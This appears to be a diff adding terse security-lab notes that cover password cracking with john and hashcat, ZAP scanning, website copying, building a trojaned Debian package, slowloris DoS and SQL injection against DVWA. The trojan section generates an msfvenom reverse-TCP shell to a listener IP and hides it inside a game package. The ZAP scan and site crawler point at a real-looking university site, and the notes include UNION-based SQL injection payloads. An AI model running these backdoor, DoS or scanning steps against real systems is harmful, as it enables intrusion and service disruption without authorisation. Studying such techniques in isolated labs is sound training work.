@@ -1,0 +1,154 @@
+-- Password Cracking --
+
+sudo apt update
+
+sudo su -
+
+apt install -y john hashcat
+
+john --version 
+
+hashcat --version 
+
+echo -e 
+"user1:\$6\$randomsalt\$hashedpasswordstring:18234:0:99999:7:::\nuser2:\$6\$anothersalt\$a
+notherhashedpasswordstring:18234:0:99999:7:::" > /root/sample_hashes.txt
+
+cat /root/sample_hashes.txt
+
+john /root/sample_hashes.txt  
+
+john --show /root/sample_hashes.txt  
+
+echo -e "password123\nadmin123\nsimplepass\ntest1234\nqwerty" > /root/custom_wordlist.txt 
+
+cat /root/custom_wordlist.txt 
+
+Hashcat:
+awk -F':' '{print $2}' /root/sample_hashes.txt > /root/clean_hashes.txt 
+
+cat /root/clean_hashes.txt  
+
+hashcat -m 1800 -a 0 /root/clean_hashes.txt /root/custom_wordlist.txt --show 
+
+john --show /root/sample_hashes.txt > /root/john_cracked.txt
+
+cat /root/john_cracked.txt 
+
+hashcat -m 1800 -a 0 /root/clean_hashes.txt /root/custom_wordlist.txt --show > 
+/root/hashcat_cracked.txt  
+
+cat /root/hashcat_cracked.txt 
+
+
+
+-- Web Vulnerablity using ZAP--
+
+install zap from zapproxy.org 
+
+cd ~/Downloads
+cd ZAP_*/
+chmod +x zap.sh
+sudo ./zap.sh
+
+Zap -> Automated Scan -> https://kct.ac.in -> Generate Report
+
+-- Copying  Website --
+
+win+r appwiz.cpl
+turn windows feature on  -> install internet information service
+
+c drive-> inetpub -> wwwroot -> website index paste 
+
+web browser -> http local host 
+
+admin cmd -> iisreset
+
+xampp -> copy website 
+
+install blackwidow -> browser -> kct.ac.in -> scanner scan -> structure index
+
+-- Trojan & Backdoors --
+
+sudo su -
+
+apt-get --download-only install freesweep
+
+mkdir /tmp/evil 
+
+mv /var/cache/apt/archives/freesweep_0.90-1_i386.deb /tmp/evil
+cd /tmp/evil/ 
+/tmp/evil# 
+
+/tmp/evil# dpkg -x freesweep_0.90-1_i386.deb work 
+/tmp/evil# mkdir work/DEBIAN
+cat control
+
+cat postinst
+!/bin/sh 
+
+ msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp 
+LHOST=192.168.1.101 LPORT=443 -b "\x00" -f elf -o 
+/tmp/evil/work/usr/games/freesweep_scores 
+
+-- DDOS --
+
+cd Desktop
+
+mkdir slowloris
+
+cd slowloris
+
+git clone https://github.com/gkbrk/slowloris.git
+
+cd slowloris
+
+ls
+
+ifconfig
+
+python3 slowloris.py <ip> -s 500
+
+another terminal:
+sudo service apache2 start
+
+service apache2 status
+
+-- FootPrinting & Port Scanning --
+
+
+-- Sql Injection --
+
+$sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg
+ 
+ 
+$sudo apt update
+ 
+$ sudo apt upgrade
+ 
+$sudo apt install docker.io
+ 
+$sudo systemctl start docker
+ 
+$sudo sytemctl enable docker
+ 
+$sudo docker pull vulnerables/web-dvwa
+ 
+$sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
+ 
+open ur browser -> type address as "localhost"
+ 
+Username: admin
+password: password
+ 
+select f_name,l_name from users where userid='1' OR '1'='1'
+ 
+1' ORDERBY 1 -- -
+1' UNION SELECT user,password FROM users --
+
+
+
+
+
+
+
